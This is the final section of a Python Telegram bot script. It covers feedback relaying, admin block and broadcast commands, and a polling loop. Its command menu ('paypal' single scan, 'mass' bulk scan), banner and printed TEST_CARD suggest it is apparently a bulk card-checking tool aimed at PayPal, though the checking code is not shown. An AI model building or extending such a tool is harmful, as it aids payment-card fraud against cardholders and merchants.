@bot.callback_query_handler(func=lambda c: c.data == 'yrr')
def cb_feedback(call):
    try:
        bot.answer_callback_query(call.id)
        uid = call.from_user.id
        kb = types.InlineKeyboardMarkup()
        kb.add(vinex_btn('Back', 'primary', callback_data='back_start'))
        try:
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                text='✍️ Send message:', parse_mode='HTML', reply_markup=kb)
        except: pass
        waiting_users[uid] = True
    except: pass

@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
def handle_user_msg(message):
    try:
        uid = message.from_user.id
        text = message.text or '(non-text)'
        kb = types.InlineKeyboardMarkup()
        kb.add(vinex_btn('Reply', 'success', callback_data=f'reply_{uid}'))
        safe_send_message(OWNER_ID, f'📩 New Message\n👤 {message.from_user.first_name}\n🆔 <code>{uid}</code>\n💬 {text}', reply_markup=kb)
        safe_send_message(uid, '✅ Sent.')
        waiting_users.pop(uid, None)
    except: pass

@bot.callback_query_handler(func=lambda c: c.data.startswith('reply_'))
def cb_reply(call):
    try:
        target = int(call.data.split('_', 1)[1])
        reply_mode[call.from_user.id] = target
        safe_send_message(call.from_user.id, '✍️ Reply:')
    except: pass

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def handle_admin_reply(message):
    try:
        target = reply_mode[message.from_user.id]
        safe_send_message(target, f'💬 <b>Admin:</b>\n\n{message.text or ""}')
        safe_send_message(OWNER_ID, '✅ Sent.')
        reply_mode.pop(message.from_user.id, None)
    except: pass

@bot.message_handler(commands=['block2'])
def admin_block(message):
    try:
        if str(message.from_user.id) not in ADMINS: return
        parts = message.text.split()
        if len(parts) < 2 or not parts[1].isdigit(): return
        uid = parts[1].strip()
        if uid in open(BLOCK_FILE).read().splitlines():
            safe_send_message(message.chat.id, '⚠️ Already blocked.'); return
        with open(BLOCK_FILE, 'a') as f: f.write(f'{uid}\n')
        safe_send_message(message.chat.id, f'✅ Blocked <code>{uid}</code>')
    except: pass

@bot.message_handler(commands=['unblock2'])
def admin_unblock(message):
    try:
        if str(message.from_user.id) not in ADMINS: return
        parts = message.text.split()
        if len(parts) < 2 or not parts[1].isdigit(): return
        uid = parts[1].strip()
        lines = open(BLOCK_FILE).readlines()
        with open(BLOCK_FILE, 'w') as f:
            for l in lines:
                if l.strip() != uid: f.write(l)
        safe_send_message(message.chat.id, f'✅ Unblocked <code>{uid}</code>')
    except: pass

@bot.message_handler(commands=['broadcast'])
def admin_broadcast(message):
    try:
        if str(message.from_user.id) not in ADMINS: return
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2: return
        txt = parts[1]
        users = [l.strip() for l in open(USERS_FILE).read().splitlines() if l.strip()]
        sent = 0; failed = 0
        for u in users:
            try:
                if safe_send_message(int(u), txt): sent += 1
                else: failed += 1
                time.sleep(0.05)
            except: failed += 1
        safe_send_message(message.chat.id, f'📢 Done. ✅{sent} ❌{failed}')
    except: pass

def vinex_setup():
    try:
        bot.set_my_commands([
            types.BotCommand('start', '🌟 Menu'),
            types.BotCommand('paypal', '⚡ Single scan'),
            types.BotCommand('mass', '📦 Bulk scan'),
            types.BotCommand('resume', '♻️ Resume'),
            types.BotCommand('stop', '🛑 Stop'),
            types.BotCommand('stats', '📊 Stats'),
            types.BotCommand('luck', '🎲 Roll dice'),
            types.BotCommand('mood', '🎭 Random emoji'),
            types.BotCommand('diag', '🔬 Diagnostics'),
            types.BotCommand('help', '💡 Guide'),
            types.BotCommand('ping', '🏓 Health'),
        ])
    except: pass
    try:
        bot.set_chat_menu_button(menu_button=types.MenuButtonCommands(type='commands'))
    except: pass

if __name__ == '__main__':
    log.info('VINEX v23.1 FINAL starting...')
    print(r'''
    __  ___  _  __ ______ _  __
   / / / _ \/ |/ // __/ / |/ /
  / /_/ // /    // _/ /    /
 /___/_//_/_/|_/___/_/_/|_/
    v23.1 — Full PayPal + Parallel + Universal
    ''')
    print(f'TEST_CARD: {TEST_CARD}')
    print(f'WORKERS: {PARALLEL_WORKERS}')
    try: cleanup_old_files()
    except: pass
    vinex_setup()
    while True:
        try:
            log.info('Polling...')
            bot.infinity_polling(timeout=60, long_polling_timeout=60, skip_pending=True, logger_level=logging.WARNING)
        except KeyboardInterrupt: break
        except Exception as e:
            err = str(e).lower()
            log.error(f'Polling crash: {str(e)[:200]}')
            if '429' in err or 'too many' in err:
                try: wait = int(err.split('retry after ')[1].split()[0])
                except: wait = 30
                time.sleep(wait)
            elif '502' in err or 'bad gateway' in err: time.sleep(20)
            else: time.sleep(15)
